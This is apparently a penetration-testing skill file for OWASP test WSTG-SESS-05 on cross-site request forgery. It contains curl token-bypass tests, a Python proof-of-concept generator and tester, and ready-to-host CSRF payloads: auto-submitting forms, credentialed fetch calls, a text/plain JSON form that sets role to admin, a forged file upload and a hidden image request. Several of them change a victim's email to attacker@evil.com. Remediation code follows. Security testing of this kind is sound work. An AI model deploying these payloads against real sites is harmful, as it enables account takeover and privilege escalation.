---
name: wstg-sess-05
description: "Testing for Cross Site Request Forgery (CSRF)"
category: session-management
owasp_id: WSTG-SESS-05
version: "1.0.0"
author: cyberstrike-official
tags: [session, cookies, csrf, token, wstg, sess]
tech_stack: [html, javascript, cookies]
cwe_ids: [CWE-352]
chains_with: [wstg-inpv-02, wstg-athn-05]
prerequisites: [wstg-sess-01]
severity_boost:
  wstg-inpv-02: "Stored XSS lets an attacker's script read the CSRF token in-origin and auto-submit forged requests, bypassing token-based CSRF defenses entirely (Critical)"
  wstg-athn-05: "A CSRF-forced action combined with a vulnerable/long-lived 'remember me' token grants persistent access that survives logout or session expiry (High)"
---

# wstg-sess-05

## Test ID

WSTG-SESS-05

## Test Name

Testing for Cross Site Request Forgery (CSRF)

## High-Level Description

Cross-Site Request Forgery (CSRF) forces authenticated users to execute unwanted actions on a web application. Attackers craft malicious requests that are automatically sent by the victim's browser with their session credentials, allowing unauthorized actions like password changes, fund transfers, or data modifications.

---

## What to Check

- [ ] CSRF token implementation
- [ ] Token validation on server
- [ ] SameSite cookie attribute
- [ ] Origin/Referer validation
- [ ] State-changing GET requests
- [ ] Token uniqueness and randomness

---

## How to Test

### Step 1: Identify State-Changing Operations

```bash
# Find endpoints that modify data
# Look for: POST, PUT, DELETE, PATCH requests
# Examples:
# - Password change
# - Email update
# - Fund transfer
# - Settings modification
# - Account deletion

# Capture requests with Burp and identify:
# 1. Endpoints that change state
# 2. Presence of CSRF tokens
# 3. Token validation behavior
```

### Step 2: Check for CSRF Tokens

```bash
#!/bin/bash
TARGET="https://target.com"

# Get authenticated page with form
page=$(curl -s -b "session=valid_session" "$TARGET/settings")

# Look for CSRF tokens
echo "$page" | grep -iE "csrf|token|_token|authenticity" | head -10

# Common token names:
# csrf_token, _csrf, csrfmiddlewaretoken, __RequestVerificationToken
# authenticity_token, _token, XSRF-TOKEN
```

### Step 3: Test Token Validation

```bash
#!/bin/bash
TARGET="https://target.com"
SESSION="valid_session_cookie"

# Test 1: Request without token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123"}'

# Test 2: Request with empty token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123","csrf_token":""}'

# Test 3: Request with invalid token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123","csrf_token":"invalid123"}'

# Test 4: Request with another user's token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123","csrf_token":"other_user_token"}'
```

### Step 4: CSRF PoC Generator

```python
#!/usr/bin/env python3

class CSRFPoCGenerator:
    def generate_form_poc(self, target_url, method, params, auto_submit=True):
        """Generate HTML form CSRF PoC"""

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf_form" action="{target_url}" method="{method}">
"""
        for name, value in params.items():
            html += f'        <input type="hidden" name="{name}" value="{value}" />\n'

        html += """        <input type="submit" value="Submit" />
    </form>
"""
        if auto_submit:
            html += """    <script>
        document.getElementById('csrf_form').submit();
    </script>
"""
        html += """</body>
</html>"""

        return html

    def generate_img_poc(self, target_url):
        """Generate image-based CSRF PoC (for GET)"""
        return f"""<!DOCTYPE html>
<html>
<body>
    <img src="{target_url}" style="display:none" />
</body>
</html>"""

    def generate_xhr_poc(self, target_url, method, data, content_type="application/json"):
        """Generate XHR CSRF PoC"""
        return f"""<!DOCTYPE html>
<html>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("{method}", "{target_url}", true);
        xhr.setRequestHeader("Content-Type", "{content_type}");
        xhr.withCredentials = true;
        xhr.send('{data}');
    </script>
</body>
</html>"""

    def generate_fetch_poc(self, target_url, method, data):
        """Generate Fetch API CSRF PoC"""
        return f"""<!DOCTYPE html>
<html>
<body>
    <script>
        fetch("{target_url}", {{
            method: "{method}",
            credentials: "include",
            headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify({data})
        }});
    </script>
</body>
</html>"""

# Usage
generator = CSRFPoCGenerator()

# Form-based PoC
form_poc = generator.generate_form_poc(
    "https://target.com/change-email",
    "POST",
    {"email": "attacker@evil.com"}
)
print(form_poc)
```

### Step 5: Comprehensive CSRF Tester

```python
#!/usr/bin/env python3
import requests
import re
from bs4 import BeautifulSoup

class CSRFTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []

    def authenticate(self, login_endpoint, credentials):
        """Authenticate and get session"""
        self.session.post(f"{self.base_url}{login_endpoint}", data=credentials)

    def test_endpoint(self, endpoint, method, data):
        """Test single endpoint for CSRF"""
        print(f"\n[*] Testing {method} {endpoint}")

        # Test 1: Without CSRF token
        print("  [1] Testing without token...")
        response = self._make_request(endpoint, method, data, include_token=False)
        if response.status_code in [200, 201, 302]:
            print("  [VULN] Request accepted without CSRF token")
            self.findings.append({
                "endpoint": endpoint,
                "issue": "No CSRF token required",
                "severity": "High"
            })

        # Test 2: With empty token
        print("  [2] Testing with empty token...")
        data_with_empty = {**data, "csrf_token": ""}
        response = self._make_request(endpoint, method, data_with_empty)
        if response.status_code in [200, 201, 302]:
            print("  [VULN] Empty CSRF token accepted")
            self.findings.append({
                "endpoint": endpoint,
                "issue": "Empty CSRF token accepted",
                "severity": "High"
            })

        # Test 3: With invalid token
        print("  [3] Testing with invalid token...")
        data_with_invalid = {**data, "csrf_token": "invalid_token_123"}
        response = self._make_request(endpoint, method, data_with_invalid)
        if response.status_code in [200, 201, 302]:
            print("  [VULN] Invalid CSRF token accepted")
            self.findings.append({
                "endpoint": endpoint,
                "issue": "Invalid CSRF token accepted",
                "severity": "High"
            })

    def _make_request(self, endpoint, method, data, include_token=True):
        """Make request with/without token"""
        url = f"{self.base_url}{endpoint}"

        if method.upper() == "POST":
            return self.session.post(url, data=data)
        elif method.upper() == "PUT":
            return self.session.put(url, json=data)
        elif method.upper() == "DELETE":
            return self.session.delete(url)

        return None

    def check_samesite_cookie(self):
        """Check SameSite cookie attribute"""
        print("\n[*] Checking SameSite cookie attribute...")

        response = self.session.get(self.base_url)

        for cookie in self.session.cookies:
            # Check raw Set-Cookie header for SameSite
            print(f"  Cookie: {cookie.name}")
            # Note: requests doesn't expose SameSite directly

    def generate_report(self):
        """Generate CSRF test report"""
        print("\n" + "="*50)
        print("CSRF TESTING REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo CSRF vulnerabilities found.")
            return

        print(f"\nVulnerabilities: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  Endpoint: {f['endpoint']}")
            print(f"  Issue: {f['issue']}")
            print(f"  Severity: {f['severity']}")

# Usage
tester = CSRFTester("https://target.com")
tester.authenticate("/login", {"username": "test", "password": "test"})
tester.test_endpoint("/api/change-email", "POST", {"email": "new@email.com"})
tester.test_endpoint("/api/change-password", "POST", {"password": "newpass"})
tester.generate_report()
```

---

## Tools

| Tool                    | Description               | Usage                                   |
| ------------------------ | -------------------------- | ----------------------------------------- |
| **Burp Suite**           | CSRF PoC generator         | Engagement tools > Generate CSRF PoC     |
| **OWASP ZAP**            | Automated CSRF scanner     | Active scan flags missing anti-CSRF tokens|
| **CSRFTester**           | OWASP standalone tool      | Record and replay CSRF requests          |
| **Browser DevTools**     | Manual request replay      | Strip/tamper token, resend               |

---

## Example Commands/Payloads

```bash
# Baseline: capture a state-changing request with a valid session + token
curl -s -b "session={session}" "https://{target}/settings" | grep -iE "csrf|_token|authenticity"

# Attempt request with token stripped entirely
curl -s -X POST "https://{target}/api/change-email" \
    -b "session={session}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=attacker@evil.com"

# Attempt request using GET for a state-changing action (common CSRF gap)
curl -s -b "session={session}" "https://{target}/api/change-email?email=attacker@evil.com"

# Method-override bypass attempt
curl -s -X POST "https://{target}/api/change-email" \
    -b "session={session}" \
    -H "X-HTTP-Method-Override: PUT" \
    -d "email=attacker@evil.com"
```

Ready-to-submit CSRF PoC (auto-submitting form, host on attacker-controlled page):

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" action="https://{target}/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

JSON-body CSRF PoC via `fetch` (for endpoints that don't check Content-Type strictly):

```html
<!DOCTYPE html>
<html>
<body>
  <script>
    fetch("https://{target}/api/change-email", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify({ email: "attacker@evil.com" })
    });
  </script>
</body>
</html>
```

Exact-JSON CSRF via an `enctype="text/plain"` auto-submit form — crafts a real `{"role":admin,...}` body using the input's `name`/`value` as JSON fragments, so it works even when the endpoint requires `Content-Type: application/json`-shaped bodies but doesn't validate the header itself, and also bypasses browsers' simple-request CORS preflight:

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf_json" action="https://{target}/api/setrole" enctype="text/plain" method="POST">
    <!-- sends: {"role":"admin", "other":"="} -->
    <input type="hidden" name='{"role":"admin", "other":"' value='"}' />
  </form>
  <script>document.getElementById('csrf_json').submit();</script>
</body>
</html>
```

`multipart/form-data` file-upload CSRF (forges a file upload via `DataTransfer`, for endpoints that only accept multipart bodies):

```html
<!DOCTYPE html>
<html>
<body>
  <form style="display:none" name="xss" method="post" action="https://{target}/api/upload" enctype="multipart/form-data">
    <input id="file" type="file" name="file"/>
  </form>
  <script>
    const dT = new DataTransfer();
    const file = new File(["CSRF-filecontent"], "CSRF-filename");
    dT.items.add(file);
    document.xss.file.files = dT.files;
    document.xss.submit();
  </script>
</body>
</html>
```

No-interaction GET CSRF via hidden `<img>` (classic zero-click variant of the GET state-change gap above):

```html
<img src="https://{target}/api/change-email?email=attacker@evil.com" style="display:none" />
```

---

## Remediation Guide

### 1. Implement CSRF Tokens

```python
# Flask with Flask-WTF
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# In template
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

### 2. SameSite Cookies

```python
app.config.update(
    SESSION_COOKIE_SAMESITE='Strict',
    SESSION_COOKIE_SECURE=True,
)
```

### 3. Origin Validation

```python
@app.before_request
def validate_origin():
    if request.method in ['POST', 'PUT', 'DELETE']:
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')

        allowed_origins = ['https://example.com']

        if origin and origin not in allowed_origins:
            abort(403)
```

---

## Risk Assessment

| Finding               | CVSS | Severity |
| --------------------- | ---- | -------- |
| No CSRF protection    | 8.8  | High     |
| Token not validated   | 8.8  | High     |
| GET for state changes | 6.5  | Medium   |

---

## CWE Categories

| CWE ID      | Title                             |
| ----------- | --------------------------------- |
| **CWE-352** | Cross-Site Request Forgery (CSRF) |

---

## References

- [OWASP WSTG - Testing for CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
- [PayloadsAllTheThings - Cross-Site Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery)


---

## Checklist

```
[ ] State-changing operations identified
[ ] CSRF token presence checked
[ ] Token validation tested
[ ] SameSite cookies checked
[ ] GET requests for state changes identified
[ ] PoC created for vulnerabilities
[ ] Findings documented
[ ] Remediation provided
```
